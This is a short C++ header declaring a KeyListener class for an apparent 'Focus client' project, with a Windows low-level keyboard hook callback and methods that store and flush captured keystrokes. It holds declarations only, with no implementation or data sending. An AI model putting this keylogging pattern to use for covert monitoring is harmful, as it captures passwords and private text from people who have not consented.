//
// Created by Etienne Pasteur on 29/01/2018.
//

#ifndef FOCUS_CLIENT_KEYLISTENER_HPP
#define FOCUS_CLIENT_KEYLISTENER_HPP

#include <atlstr.h>
#include <Windows.h>
#include <vector>
#include "IKeyListener.hpp"

class KeyListener : public IKeyListener
{
public:
	~KeyListener();

	void Run() override final;

	std::string Flush() override final;

	void PushKeylog(std::string& keylog) override final;

	KeyListener();

private:
	static LRESULT CALLBACK LowLevelKeyboardProc(int code, WPARAM wp, LPARAM lp);
	std::vector<std::string> _capturedInputs;
};

#endif //FOCUS_CLIENT_KEYLISTENER_HPP
